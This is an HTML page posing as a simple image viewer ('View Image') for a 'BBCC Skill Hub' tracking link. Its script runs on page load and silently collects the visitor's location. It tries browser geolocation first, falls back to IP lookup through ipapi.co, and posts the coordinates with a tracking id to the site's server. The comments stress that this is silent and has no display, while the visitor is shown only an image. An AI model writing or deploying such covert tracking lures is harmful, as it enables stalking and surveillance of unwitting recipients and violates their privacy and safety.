<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>📸 View Image</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap" rel="stylesheet" />

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            background: #0b0e1a;
            color: #ffffff;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            flex-direction: column;
        }

        .image-container {
            max-width: 90vw;
            max-height: 85vh;
            position: relative;
            animation: fadeIn 0.8s ease;
        }
        .image-container img {
            max-width: 100%;
            max-height: 80vh;
            border-radius: 16px;
            box-shadow: 0 30px 80px rgba(0,0,0,0.5);
            background: #1a1f35;
        }

        .loading {
            text-align: center;
            padding: 40px;
            color: rgba(255,255,255,0.3);
        }
        .loading i {
            font-size: 48px;
            display: block;
            margin-bottom: 15px;
        }

        .watermark {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            color: rgba(255,255,255,0.06);
            font-size: 12px;
            letter-spacing: 0.1em;
            font-family: 'Inter', sans-serif;
        }

        .error {
            text-align: center;
            padding: 40px;
        }
        .error h1 { color: #ffd700; font-size: 32px; }
        .error p { color: rgba(255,255,255,0.5); margin-top: 10px; }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        .tracking-info {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(0,0,0,0.5);
            backdrop-filter: blur(10px);
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 11px;
            color: rgba(255,255,255,0.3);
            border: 1px solid rgba(255,255,255,0.03);
        }

        .status-dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #22c55e;
            margin-right: 6px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        @media (max-width: 768px) {
            .tracking-info { display: none; }
        }
    </style>
</head>
<body>

    <div class="tracking-info">
        <span class="status-dot"></span> Tracking Live · BBCC
    </div>

    <div class="image-container" id="imageContainer">
        <div class="loading" id="loading">
            <i class="fas fa-spinner fa-spin"></i>
            <p>Loading image...</p>
        </div>
    </div>

    <div class="watermark">🔒 Tracked · BBCC Skill Hub</div>

    <script>
        const API_BASE = window.location.origin + '/api';

        // ============================================
        // GET TRACK ID FROM URL
        // ============================================
        function getTrackId() {
            const params = new URLSearchParams(window.location.search);
            return params.get('id');
        }

        // ============================================
        // AUTO CAPTURE LOCATION - NO POPUP
        // ============================================
        function autoCaptureLocation() {
            let locationData = { lat: null, lng: null, source: 'IP' };

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        locationData = {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            source: 'GPS'
                        };
                        sendVisitData(locationData);
                    },
                    () => {
                        getLocationFromIP(locationData);
                    },
                    { 
                        enableHighAccuracy: true, 
                        timeout: 3000,
                        maximumAge: 60000
                    }
                );
            } else {
                getLocationFromIP(locationData);
            }
        }

        async function getLocationFromIP(locationData) {
            try {
                const res = await fetch(`https://ipapi.co/json/`);
                const data = await res.json();
                if (data && !data.error) {
                    locationData.lat = data.latitude || null;
                    locationData.lng = data.longitude || null;
                    locationData.source = 'IP';
                }
            } catch (e) {
                console.log('IP location failed:', e);
            }
            sendVisitData(locationData);
        }

        // ============================================
        // SEND VISIT DATA TO SERVER (Silent - No Display)
        // ============================================
        async function sendVisitData(locationData) {
            const trackId = getTrackId();
            if (!trackId) return;

            try {
                const data = {
                    track_id: trackId,
                    lat: locationData.lat || null,
                    lng: locationData.lng || null
                };

                await fetch(`${API_BASE}/tracking/visit`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (e) {
                // Silent fail - don't show any error to user
                console.log('Visit tracking failed:', e);
            }
        }

        // ============================================
        // FETCH AND SHOW IMAGE ONLY - DATA SAVE HOTA HAI
        // ============================================
        async function fetchImage() {
            const trackId = getTrackId();
            if (!trackId) {
                document.getElementById('imageContainer').innerHTML = `
                    <div class="error">
                        <h1>🔗 Invalid Link</h1>
                        <p>This tracking link is invalid or expired.</p>
                    </div>
                `;
                return;
            }

            try {
                const res = await fetch(`${API_BASE}/tracking/image/${trackId}`);
                const result = await res.json();

                if (result.success) {
                    // Only show image - no data display
                    // Data already saved via sendVisitData() above
                    document.getElementById('loading').style.display = 'none';
                    document.getElementById('imageContainer').innerHTML = `
                        <img src="${result.data.image_url}" alt="Image" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22500%22 height=%22300%22%3E%3Crect width=%22500%22 height=%22300%22 fill=%22%231a1f35%22/%3E%3Ctext x=%22250%22 y=%22150%22 text-anchor=%22middle%22 fill=%22%23ffd700%22 font-size=%2224%22 font-family=%22sans-serif%22%3E🔗 Image Not Found%3C/text%3E%3C/svg%3E'" />
                    `;
                } else {
                    document.getElementById('imageContainer').innerHTML = `
                        <div class="error">
                            <h1>🔗 Image Not Found</h1>
                            <p>${result.message || 'The image could not be loaded.'}</p>
                        </div>
                    `;
                }
            } catch (err) {
                document.getElementById('imageContainer').innerHTML = `
                    <div class="error">
                        <h1>⚠️ Server Error</h1>
                        <p>Something went wrong. Please try again later.</p>
                    </div>
                `;
            }
        }

        // ============================================
        // INIT
        // ============================================
        document.addEventListener('DOMContentLoaded', function() {
            // Auto capture location - SILENT (no popup, no display)
            // Ye har baar call hoga jab koi page open karega
            autoCaptureLocation();
            
            // Fetch and show image only
            fetchImage();
        });
    </script>

</body>
</html>
